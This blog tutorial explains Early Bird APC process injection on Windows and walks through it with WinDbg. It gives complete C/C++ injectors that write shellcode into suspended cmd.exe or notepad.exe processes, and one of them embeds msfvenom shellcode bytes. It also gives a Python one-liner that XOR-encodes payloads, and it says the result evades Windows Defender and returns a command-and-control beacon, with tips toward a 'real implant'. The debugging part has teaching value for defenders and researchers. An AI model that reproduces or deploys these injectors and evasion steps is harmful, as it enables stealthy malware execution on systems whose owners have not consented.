---
title: Queue Early Bird Injection
tags:
---
# Asynchronous Procedure Call (APC)

![](/img/EarlyBirdCover.png)

An APC is a Windows mechanism that allows a function to be queued for execution in context of specific thread. When a thread enters an alertable state (by calling functions like `SleepEx`, `WaitForSingleObjectsEx`, `MsgWaitForMultipleObjects` etc...), the Windows kernel checks if there are any pending APC queued to that thread and executes them. There is two types of APCs.

![](/img/APC.png)

1. **User-mode APC** which is executed in user context, this is what we care about in this blog.
2. **Kernel-mode APC** which is executed in kernel context, used by OS itself.

They key user-mode API is:

```c
DWORD QueueUserAPC(
    PAPCFUNC pfnAPC,      // pointer to the APC function (our shellcode)
    HANDLE   hThread,     // target thread
    ULONG_PTR dwData      // parameter passed to APC function
);
```

This above queues a function to execute the next time the target thread enters an alertable state.
# Regular APC Injection and Early Bird

Regular APC injection targets on **already running** thread in an existing process. The problem is that the thread must enter an alertable state on its own, you can't force it. If thread never calls `SleepEx` or similar, APC never runs. It's reliable in practice but yeh not guaranteed. Early bird solves this by creating a process in a suspended state before it has finished initializing. At this point the main thread has not run a single instruction of executable yet and AV or EDR hooks injected via `DLL_PROCESS_ATTACH` may not have fired yet so we control exactly when execution resumes.

We can queue the APC before the thread ever runs, then resume it. The very first thing the thread will do when it start is execute the shellcode. Hence the name **Early Bird**.
## Early Bird 

<svg width="100%" viewBox="0 0 680 720" role="img" xmlns="http://www.w3.org/2000/svg">
  <title>Early Bird APC injection flow</title>
  <desc>Six sequential steps showing how Early Bird APC injection works.</desc>
  <defs>
    <marker id="arrow" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
      <path d="M2 1L8 5L2 9" fill="none" stroke="context-stroke" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
    </marker>
  </defs>

  <text x="340" y="34" text-anchor="middle" font-family="sans-serif" font-size="16" font-weight="500" fill="#2C2C2A">Early bird APC flow</text>

  <!-- Step 1: CreateProcess -->
  <rect x="160" y="60" width="360" height="64" rx="8" fill="#F1EFE8" stroke="#5F5E5A" stroke-width="0.5"/>
  <text x="340" y="84" text-anchor="middle" dominant-baseline="central" font-family="sans-serif" font-size="14" font-weight="500" fill="#2C2C2A">CreateProcess(CREATE_SUSPENDED)</text>
  <text x="340" y="104" text-anchor="middle" dominant-baseline="central" font-family="sans-serif" font-size="12" fill="#5F5E5A">Main thread frozen, no code executed</text>
  <line x1="340" y1="124" x2="340" y2="156" stroke="#73726c" stroke-width="1.5" marker-end="url(#arrow)"/>

  <!-- Step 2: VirtualAllocEx -->
  <rect x="160" y="160" width="360" height="64" rx="8" fill="#E6F1FB" stroke="#185FA5" stroke-width="0.5"/>
  <text x="340" y="184" text-anchor="middle" dominant-baseline="central" font-family="sans-serif" font-size="14" font-weight="500" fill="#0C447C">VirtualAllocEx</text>
  <text x="340" y="204" text-anchor="middle" dominant-baseline="central" font-family="sans-serif" font-size="12" fill="#185FA5">Allocate RWX memory in target</text>
  <line x1="340" y1="224" x2="340" y2="256" stroke="#73726c" stroke-width="1.5" marker-end="url(#arrow)"/>

  <!-- Step 3: WriteProcessMemory -->
  <rect x="160" y="260" width="360" height="64" rx="8" fill="#E6F1FB" stroke="#185FA5" stroke-width="0.5"/>
  <text x="340" y="284" text-anchor="middle" dominant-baseline="central" font-family="sans-serif" font-size="14" font-weight="500" fill="#0C447C">WriteProcessMemory</text>
  <text x="340" y="304" text-anchor="middle" dominant-baseline="central" font-family="sans-serif" font-size="12" fill="#185FA5">Write shellcode into allocation</text>
  <line x1="340" y1="324" x2="340" y2="356" stroke="#73726c" stroke-width="1.5" marker-end="url(#arrow)"/>

  <!-- Step 4: QueueUserAPC -->
  <rect x="160" y="360" width="360" height="64" rx="8" fill="#EEEDFE" stroke="#534AB7" stroke-width="0.5"/>
  <text x="340" y="384" text-anchor="middle" dominant-baseline="central" font-family="sans-serif" font-size="14" font-weight="500" fill="#3C3489">QueueUserAPC</text>
  <text x="340" y="404" text-anchor="middle" dominant-baseline="central" font-family="sans-serif" font-size="12" fill="#534AB7">Queue shellcode to suspended thread</text>
  <line x1="340" y1="424" x2="340" y2="456" stroke="#73726c" stroke-width="1.5" marker-end="url(#arrow)"/>

  <!-- Step 5: ResumeThread -->
  <rect x="160" y="460" width="360" height="64" rx="8" fill="#EEEDFE" stroke="#534AB7" stroke-width="0.5"/>
  <text x="340" y="484" text-anchor="middle" dominant-baseline="central" font-family="sans-serif" font-size="14" font-weight="500" fill="#3C3489">ResumeThread</text>
  <text x="340" y="504" text-anchor="middle" dominant-baseline="central" font-family="sans-serif" font-size="12" fill="#534AB7">Thread runs pending APC first</text>
  <line x1="340" y1="524" x2="340" y2="556" stroke="#73726c" stroke-width="1.5" marker-end="url(#arrow)"/>

  <!-- Step 6: Shellcode executes -->
  <rect x="120" y="560" width="440" height="64" rx="8" fill="#FAECE7" stroke="#993C1D" stroke-width="0.5"/>
  <text x="340" y="584" text-anchor="middle" dominant-baseline="central" font-family="sans-serif" font-size="14" font-weight="500" fill="#712B13">Shellcode executes</text>
  <text x="340" y="604" text-anchor="middle" dominant-baseline="central" font-family="sans-serif" font-size="12" fill="#993C1D">Runs inside legitimate-looking process</text>
</svg>

The suspended thread is in special state where it will treat any queued APC as immediately pending. The moment `ResumeThread` is called, before the process entry point runs, the APC dispatcher fires first.

Every thread in Windows has an **APC queue**, basically a linked list maintained in the kernel's `KTHREAD` structure. When `QueueUserAPC` is called, it adds a `KAPC` object to that list.

```c
KTHREAD
├── ApcState
│   ├── ApcListHead[KernelMode]  
│   └── ApcListHead[UserMode]    
└── ...
```

When a thread is resumed from suspension, the kernels checks `ApcState.ApcListHead[UserMode]`. If entries exist, it delivers them before handing control to the thread's normal execution path. This is the reason for working of Early Bird, the APC list is checked on resume, not just on alertable waits. The `PAPCFUNC` prototype Windows expects is:

```c
VOID CALLBACK APCProc(ULONG_PTR dwParam);
```

When we cast our shellcode address to `PAPCFUNC`, Windows calls it with single parameter. Shellcode written for this doesn't use the parameter so it's fine to pass `NULL`. Ok now we understand the basics let's do it step by step.
### Spawn the Target Process Suspended

We can create `cmd.exe` in a suspended state using `CREATE_SUSPENDED`. At this point the process exists in memory with a valid PEB and address space, but the main thread has not executed a single instruction.

```c
STARTUPINFOA si = { sizeof(si) };
PROCESS_INFORMATION pi = { 0 };

CreateProcessA(
    "C:\\Windows\\System32\\cmd.exe",
    NULL, NULL, NULL,
    FALSE,
    CREATE_SUSPENDED,   
    NULL, NULL,
    &si, &pi
);

printf("[+] cmd.exe spawned suspended. PID: %lu\n", pi.dwProcessId);
```
### Allocate Memory in the Target Process

We need a place inside the target process's address space to write our shellcode. `VirtualAllocEx` allocates memory in a remote process.

```c
SIZE_T shellSize = sizeof(buf);

LPVOID shellAddress = VirtualAllocEx(
    pi.hProcess,            // handle to remote process
    NULL,                   // let OS choose address
    shellSize,              // size of allocation
    MEM_COMMIT | MEM_RESERVE,
    PAGE_EXECUTE_READWRITE  
);

if (!shellAddress) {
    printf("[-] VirtualAllocEx failed: %lu\n", GetLastError());
    return 1;
}

printf("[+] Shellcode allocated at: %p\n", shellAddress);
```

`PAGE_EXECUTE_READWRITE` is a strong IOC. No legitimate allocation in a normal process is both writable and executable. In a real implant we would write with `PAGE_READWRITE`, then flip to `PAGE_EXECUTE_READ` using `VirtualProtectEx` after writing. For this demo we keep it simple.
### Write Shellcode into Allocated Memory

```c
SIZE_T bytesWritten = 0;

BOOL ok = WriteProcessMemory(
    pi.hProcess,        // remote process handle
    shellAddress,       // destination (the allocation above)
    buf,                // our shellcode bytes
    shellSize,          // number of bytes to write
    &bytesWritten
);

if (!ok || bytesWritten != shellSize) {
    printf("[-] WriteProcessMemory failed: %lu\n", GetLastError());
    return 1;
}

printf("[+] Wrote %zu bytes of shellcode\n", bytesWritten);
```

The shellcode bytes now live inside `cmd.exe`'s virtual address space at `shellAddress`. The process still hasn't run anything and the main thread is still suspended.
### Queue the APC

This is the core of the technique. We queue the shellcode address as an APC function on the main thread of the suspended process.

```c
// Cast shellcode address to APC function pointer type
PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress;

DWORD result = QueueUserAPC(
    (PAPCFUNC)apcRoutine,   // function to queue
    pi.hThread,             // target thread (main thread, currently suspended)
    NULL                    // parameter (shellcode ignores this)
);

if (!result) {
    printf("[-] QueueUserAPC failed: %lu\n", GetLastError());
    return 1;
}

printf("[+] APC queued to main thread\n");
```

The APC is now sitting in the kernel's `ApcListHead[UserMode]` queue attached to `pi.hThread`.  
### Resume the Thread

```c
printf("[*] Press ENTER to resume and execute shellcode...\n");
getchar(); 

ResumeThread(pi.hThread);

printf("[+] Thread resumed. Shellcode executing\n");
```

When `ResumeThread` is called, the kernel transitions the thread from suspended to runnable. Before the thread's normal execution path begins (before the process entry point), the kernel's APC delivery mechanism fires. It sees our queued APC and calls `shellAddress` directly.
### Full Code

```c
#define _WIN32_WINNT 0x0600

#include <windows.h>
#include <stdio.h>

// pops "Hello from Early Bird!" / "APC Injection"
// Generated: msfvenom -p windows/x64/messagebox TEXT="Hello from Early Bird!" TITLE="APC Injection" -f c
unsigned char buf[] =
"\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xcc\x00\x00\x00\x41"
"\x51\x41\x50\x52\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b"
"\x52\x18\x51\x56\x48\x8b\x52\x20\x4d\x31\xc9\x48\x8b\x72"
"\x50\x48\x0f\xb7\x4a\x4a\x48\x31\xc0\xac\x3c\x61\x7c\x02"
"\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x48\x8b"
"\x52\x20\x41\x51\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18"
"\x0b\x02\x0f\x85\x72\x00\x00\x00\x8b\x80\x88\x00\x00\x00"
"\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x44\x8b\x40\x20\x49"
"\x01\xd0\x8b\x48\x18\xe3\x56\x4d\x31\xc9\x48\xff\xc9\x41"
"\x8b\x34\x88\x48\x01\xd6\x48\x31\xc0\x41\xc1\xc9\x0d\xac"
"\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39"
"\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b"
"\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48"
"\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41"
"\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
"\x8b\x12\xe9\x4b\xff\xff\xff\x5d\xe8\x0b\x00\x00\x00\x75"
"\x73\x65\x72\x33\x32\x2e\x64\x6c\x6c\x00\x59\x41\xba\x4c"
"\x77\x26\x07\xff\xd5\x49\xc7\xc1\x00\x00\x00\x00\xe8\x17"
"\x00\x00\x00\x48\x65\x6c\x6c\x6f\x20\x66\x72\x6f\x6d\x20"
"\x45\x61\x72\x6c\x79\x20\x42\x69\x72\x64\x21\x00\x5a\xe8"
"\x0e\x00\x00\x00\x41\x50\x43\x20\x49\x6e\x6a\x65\x63\x74"
"\x69\x6f\x6e\x00\x41\x58\x48\x31\xc9\x41\xba\x45\x83\x56"
"\x07\xff\xd5\x48\x31\xc9\x41\xba\xf0\xb5\xa2\x56\xff\xd5";

int main() {

    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };

    if (!CreateProcessA(
            "C:\\Windows\\System32\\cmd.exe",
            NULL, NULL, NULL,
            FALSE,
            CREATE_SUSPENDED,
            NULL, NULL,
            &si, &pi))
    {
        printf("[-] CreateProcess failed: %lu\n", GetLastError());
        return 1;
    }

    printf("[+] cmd.exe created suspended. PID: %lu\n", pi.dwProcessId);

    SIZE_T shellSize = sizeof(buf);

    LPVOID shellAddress = VirtualAllocEx(
        pi.hProcess,
        NULL,
        shellSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    if (!shellAddress) {
        printf("[-] VirtualAllocEx failed: %lu\n", GetLastError());
        TerminateProcess(pi.hProcess, 1);
        return 1;
    }

    printf("[+] Shellcode memory allocated at: %p\n", shellAddress);

    SIZE_T bytesWritten = 0;

    if (!WriteProcessMemory(pi.hProcess, shellAddress, buf, shellSize, &bytesWritten)) {
        printf("[-] WriteProcessMemory failed: %lu\n", GetLastError());
        TerminateProcess(pi.hProcess, 1);
        return 1;
    }

    printf("[+] Wrote %zu bytes of shellcode\n", bytesWritten);

    if (!QueueUserAPC((PAPCFUNC)shellAddress, pi.hThread, (ULONG_PTR)NULL)) {
        printf("[-] QueueUserAPC failed: %lu\n", GetLastError());
        TerminateProcess(pi.hProcess, 1);
        return 1;
    }

    printf("[+] APC queued to main thread\n");
    printf("[*] Press ENTER to resume...\n");
    getchar();

    ResumeThread(pi.hThread);

    printf("[+] Thread resumed. MessageBox executing inside cmd.exe\n");

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    return 0;
}
```

We can also put Windows Stageless payload.

![](/img/apc-stageless.png)

If we normally do it the Window's defender will detect with so we can include XOR encryption on the output shellcode and RW to RX flip. P.S also changed to `notepad.exe` for less making it less SUS.

```bash
python3 -c "data=open('updatex64.bin','rb').read();key=0xAA;enc=bytes(b^key for b in data);print('unsigned char buf[] = {');print(', '.join(hex(b) for b in enc));print('};');print(f'unsigned int buf_len = {len(enc)};')" > shellcode.h
```

Full code (with `shellcode.h`):

```cpp
#define _WIN32_WINNT 0x0600

#include <windows.h>
#include <stdio.h>
#include "shellcode.h"

#define XOR_KEY 0xAA

void xor_decrypt(unsigned char *data, unsigned int len) {
    for (unsigned int i = 0; i < len; i++)
        data[i] ^= XOR_KEY;
}

int main() {

    xor_decrypt(buf, buf_len);

    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };

    if (!CreateProcessA(
            "C:\\Windows\\System32\\notepad.exe",
            NULL, NULL, NULL,
            FALSE,
            CREATE_SUSPENDED,
            NULL, NULL,
            &si, &pi))
    {
        printf("[-] CreateProcess failed: %lu\n", GetLastError());
        return 1;
    }

    printf("[+] notepad.exe created suspended. PID: %lu\n", pi.dwProcessId);

    LPVOID shellAddress = VirtualAllocEx(
        pi.hProcess,
        NULL,
        buf_len,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    if (!shellAddress) {
        printf("[-] VirtualAllocEx failed: %lu\n", GetLastError());
        TerminateProcess(pi.hProcess, 1);
        return 1;
    }

    printf("[+] Shellcode memory allocated at: %p\n", shellAddress);

    SIZE_T bytesWritten = 0;

    if (!WriteProcessMemory(pi.hProcess, shellAddress, buf, buf_len, &bytesWritten)) {
        printf("[-] WriteProcessMemory failed: %lu\n", GetLastError());
        TerminateProcess(pi.hProcess, 1);
        return 1;
    }

    printf("[+] Wrote %u bytes of shellcode\n", buf_len);

    DWORD oldProtect = 0;
    if (!VirtualProtectEx(pi.hProcess, shellAddress, buf_len, PAGE_EXECUTE_READ, &oldProtect)) {
        printf("[-] VirtualProtectEx failed: %lu\n", GetLastError());
        TerminateProcess(pi.hProcess, 1);
        return 1;
    }

    printf("[+] Memory flipped to RX\n");

    if (!QueueUserAPC((PAPCFUNC)shellAddress, pi.hThread, (ULONG_PTR)NULL)) {
        printf("[-] QueueUserAPC failed: %lu\n", GetLastError());
        TerminateProcess(pi.hProcess, 1);
        return 1;
    }

    printf("[+] APC queued to main thread\n");
    printf("[*] Press ENTER to resume...\n");
    getchar();

    ResumeThread(pi.hThread);

    printf("[+] Thread resumed. Beacon executing inside notepad.exe\n");

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    return 0;
}
```

Then compile:

```bash
x86_64-w64-mingw32-g++ EarlyBird.cpp -o EarlyBird.exe -static
```

Now if you compile and run it, WinDefender won't detect it and you get beacon.

![](/img/apc-beacon.png)

# Debugging with WinDbg 

Now for debugging we can attach the process `notepad.exe` when we run `EarlyBird.exe` in WinDbg:

We can list the threads using `~`:

![](/img/Windbg.png)

Thread 0 (`19a8`) has Suspend: 2, one suspension from `CREATE_SUSPENDED` in our injector, one added by WinDbg on attach. This is the main thread, the one our APC is queued on. All other threads have Suspend: 1, only the debugger's suspension, meaning they were already running when we attached. Each thread has a TEB address listed. Thread 0's TEB is at `00000095aab05000`, we use this later.

![](/img/Windbg2.png)

`~0s` switches the active context to thread 0. WinDbg shows it's currently sitting at `ntdll!RtlUserThreadStart`, the very first function a new thread runs. This confirms the thread has executed zero instructions of notepad's own code. The APC is already queued and waiting.

From `~` output we saw:

```c
  00000095`aab05000  00000000`00000000 00000095`aa9d0000
  00000095`aab05010  00000095`aa9bf000 00000000`00000000
  00000095`aab05020  00000000`00001e00 00000000`00000000
  00000095`aab05030  00000095`aab05000 00000000`00000000
  00000095`aab05040  00000000`0000228c 00000000`000019a8
```

At offset `+0x040` we can see two values: `0000228c` and `000019a8`. In the TEB the `ClientId` field sits at `+0x040`:

  - `0x228c` = Process ID it matches the PID printed by EarlyBird (PID: 228c in hex = 8844 decimal)
  - `0x19a8` = Thread ID it matches thread 0's ID from the ~ output (19a8)

Now we can set the APC Breakpoint:

```bash
0:000> bp ntdll!KiUserApcDispatcher
0:000> bl
0 e Disable Clear  00007ff8`c3fd12e0  0001 (0001) 0:**** ntdll!KiUserApcDispatcher
```

 `KiUserApcDispatcher` is the function Windows calls to deliver a user-mode APC to a thread. It's an exported function in `ntdll` so the breakpoint resolves without symbols.

```c
0:000> g
ModLoad: 00007ff8`c36a0000 00007ff8`c36cf000   C:\WINDOWS\System32\IMM32.DLL
Breakpoint 0 hit
ntdll!KiUserApcDispatcher:
00007ff8`c3fd12e0 488b4c2418      mov     rcx,qword ptr [rsp+18h] ss:00000095`aa9ceee8={ntdll!Ordinal8 (00007ff8`c3fafb10)}
```

We pressed ENTER in the EarlyBird console which triggered `ResumeThread`.  WinDbg immediately broke at `KiUserApcDispatcher`. Use `k` to see the call stack.

```c
0:000> k
 # Child-SP          RetAddr               Call Site
00 00000095`aa9ceed0 00007ff8`c3fd0dd4     ntdll!KiUserApcDispatcher
01 00000095`aa9cf428 00007ff8`c3fa60ad     ntdll!NtTestAlert+0x14
02 00000095`aa9cf430 00007ff8`c3fa5c73     ntdll!LdrInitializeThunk+0x49d
03 00000095`aa9cf4d0 00007ff8`c3fa5c1e     ntdll!LdrInitializeThunk+0x63
04 00000095`aa9cf500 00000000`00000000     ntdll!LdrInitializeThunk+0xe
```

  This is the most important output of the entire session. Read it bottom to top:

  - `LdrInitializeThunk` at frames 02–04: this is the Windows loader's thread initialization function. The thread just woke up and entered here and notepad's entry point has never been called.
  - `NtTestAlert+0x14` at frame 01: NtTestAlert is the syscall that checks the thread's APC queue. When a suspended thread resumes, the kernel calls `NtTestAlert` automatically which drains any pending APCs. This is what found our queued shellcode.
  - `KiUserApcDispatcher` at frame 00: we are here right now. Windows is in the middle of delivering the APC to the thread.

We can look into registers:

```c
0:000> r
rax=0000000000000000 rbx=0000000000000000 rcx=00007ff8c3fd12e0
rdx=0000000000000000 rsi=0000000000000001 rdi=0000000000000000
rip=00007ff8c3fd12e0 rsp=00000095aa9ceed0 rbp=0000000000000000
 r8=00000095aa9ceed0  r9=0000000000000000 r10=0000000000000000
r11=0000000000000246 r12=0000000000002000 r13=00000095aa9cf550
r14=0000000000002000 r15=00000095aab05000
iopl=0         nv up ei pl zr na po nc
cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
ntdll!KiUserApcDispatcher:
00007ff8`c3fd12e0 488b4c2418      mov     rcx,qword ptr [rsp+18h] ss:00000095`aa9ceee8={ntdll!Ordinal8 (00007ff8`c3fafb10)}
```

`rip` `00007ff8c3fd12e0` confirms we are at the first instruction of `KiUserApcDispatcher`. `rcx` currently is also `00007ff8c3fd12e0` because dispatcher hasn't executed its first instruction yet, that instruction is what loads the actual shellcode address into RCX. So we can see the disassembly of dispatcher.

```c
0:000> u @rcx
ntdll!KiUserApcDispatcher:
00007ff8`c3fd12e0 488b4c2418      mov     rcx,qword ptr [rsp+18h]
00007ff8`c3fd12e5 488bc1          mov     rax,rcx
00007ff8`c3fd12e8 4c8bcc          mov     r9,rsp
00007ff8`c3fd12eb 48c1f902        sar     rcx,2
00007ff8`c3fd12ef 488b542408      mov     rdx,qword ptr [rsp+8]
00007ff8`c3fd12f4 48f7d9          neg     rcx
00007ff8`c3fd12f7 4c8b442410      mov     r8,qword ptr [rsp+10h]
00007ff8`c3fd12fc 480fa4c920      shld    rcx,rcx,20h
```

`mov rcx, [rsp+18h]` is where Windows loads the APC routine address (our shellcode) from the stack into RCX.

The technique is well understood by EDRs now, raw implementation like the one that bypassed defender will get caught by mature EDRs on behavioral sequencing alone. The next steps toward a real implant can involve syscall obfuscation, sleep masking and shellcode encryption (which we have done) but understanding the base mechanism at this level can make advanced topics make sense.

---
